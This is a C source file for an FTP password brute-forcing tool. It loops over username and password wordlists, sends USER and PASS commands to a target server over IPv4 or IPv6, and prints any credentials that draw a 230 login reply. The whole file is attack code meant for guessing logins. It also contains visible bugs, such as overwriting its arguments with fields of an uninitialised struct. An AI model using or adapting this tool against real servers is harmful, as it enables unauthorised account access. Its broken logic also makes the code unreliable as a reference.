#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <regex.h>
#include <time.h>
#include <pthread.h>
#include <sys/types.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <unistd.h>

#define BUFFER 1024

typedef struct
{
    char *target;
    char *user;
    char *passwd;
    char *connectionType;
    int port;
} socketConnection;

typedef struct
{
    socketConnection *connection;
    FILE *userFile;
    FILE *passFile;
    int verbose;
    int silent;
} bruteForceArgs;

void error(char *msg)
{
    perror(msg);
    exit(1);
}

void connectToServer(char *target, char *user, char *passwd, char *connectionType, int port, int verbose, int silent)
{
    int sockfd;
    char buffer[BUFFER];

    socketConnection *connection = malloc(sizeof(socketConnection));
    target = connection->target;
    user = connection->user;
    passwd = connection->passwd;
    connectionType = connection->connectionType;
    port = connection->port;

    int connectionResult = 0;

    struct sockaddr_in6 server_addr6;
    struct sockaddr_in server_addr;

    if (strcmp(connectionType, "-ipv4") == 0)
    {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0)
        {
            error("[-] Error creating socket");
            exit(1);
        }

        memset(&server_addr, '0', sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        server_addr.sin_addr.s_addr = inet_addr(target);

        connectionResult = connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    else if (strcmp(connectionType, "-ipv6") == 0)
    {
        sockfd = socket(AF_INET6, SOCK_STREAM, 0);
        if (sockfd < 0)
        {
            error("[-] Error creating socket");
            exit(1);
        }

        memset(&server_addr6, '0', sizeof(server_addr6));
        server_addr6.sin6_family = AF_INET6;
        server_addr6.sin6_port = htons(port);
        server_addr6.sin6_addr = in6addr_any;

        if (inet_pton(AF_INET6, target, &server_addr6.sin6_addr) <= 0)
        {
            error("[-] Error connecting to server");
            exit(1);
        }

        connectionResult = connect(sockfd, (struct sockaddr *)&server_addr6, sizeof(server_addr6));
    }
    else
    {
        error("[-] Error connecting to server");
        exit(1);
    }

    if (connectionResult < 0)
    {
        error("[-] Error connecting to server");
        exit(1);
    }

    if (verbose)
        printf("[+] Connected to server\n");

    read(sockfd, buffer, BUFFER);

    if (verbose)
    {
        printf("Send Username: %s\n", user);
    }
    snprintf(buffer, BUFFER, "USER %s\r\n", user);
    write(sockfd, buffer, strlen(buffer));
    read(sockfd, buffer, BUFFER);

    if (verbose)
    {
        printf("Send Pass: %s\n", passwd);
    }
    snprintf(buffer, BUFFER, "PASS %s\r\n", passwd);
    write(sockfd, buffer, strlen(buffer));

    int n = read(sockfd, buffer, BUFFER);

    if (n < 0)
    {
        error("[-] Error reading from socket");
        exit(1);
    }
    else
    {
        buffer[n] = '\0'; // null terminate the string

        snprintf(buffer, BUFFER, "QUIT\r\n");
        write(sockfd, buffer, strlen(buffer));

        regex_t regex;
        regcomp(&regex, "230", REG_EXTENDED);
        int match = regexec(&regex, buffer, 0, NULL, 0);

        if (match == 0)
        {
            if (!silent)
            {
                printf("[+] Login successful\n");
                printf("[+] Username: %s\n", user);
                printf("[+] Password: %s\n", passwd);
            }

            exit(1);
        }
        regfree(&regex);
        close(sockfd);
    }
}

void *bruteForce(void *arg)
{
    bruteForceArgs *args = (bruteForceArgs *)arg;
    char user[BUFFER];
    char passwd[BUFFER];

    char *target = args->connection->target;
    char *connectionType = args->connection->connectionType;
    int port = args->connection->port;

    int verbose = args->verbose;
    int silent = args->silent;

    if (args->userFile != NULL)
    {
        while (fgets(user, BUFFER, args->userFile))
        {
            user[strcspn(user, "\n")] = '\0';

            if (args->passFile != NULL)
            {
                rewind(args->passFile);
                while (fgets(passwd, BUFFER, args->passFile))
                {
                    passwd[strcspn(passwd, "\n")] = '\0';

                    if (!silent)
                    {
                        if (verbose)
                            printf("[*] Trying user: %s, pass: %s\n", user, passwd);
                        else
                            printf("[*] Trying user: %s\n", user);
                    }

                    connectToServer(target, user, passwd, connectionType, port, verbose, silent);
                }
            }
            else
            {
                if (!silent)
                {
                    if (verbose)
                        printf("[*] Trying user: %s, pass: %s\n", user, passwd);
                    else
                        printf("[*] Trying user: %s\n", user);
                }

                connectToServer(target, user, "", connectionType, port, verbose, silent);
            }
        }
    }
    else
    {
        if (args->passFile != NULL)
        {
            while (fgets(passwd, BUFFER, args->passFile))
            {
                passwd[strcspn(passwd, "\n")] = '\0';

                if (!silent)
                {
                    if (verbose)
                        printf("[*] Trying user: %s, pass: %s\n", user, passwd);
                    else
                        printf("[*] Trying pass: %s\n", passwd);
                }

                connectToServer(target, "", passwd, connectionType, port, verbose, silent);
            }
        }
        else
        {
            if (!silent)
            {
                if (verbose)
                    printf("[*] Trying user: %s, pass: %s\n", user, passwd);
                else
                    printf("[*] Trying default credentials\n");
            }

            connectToServer(target, "", "", connectionType, port, verbose, silent);
        }
    }

    return NULL;
}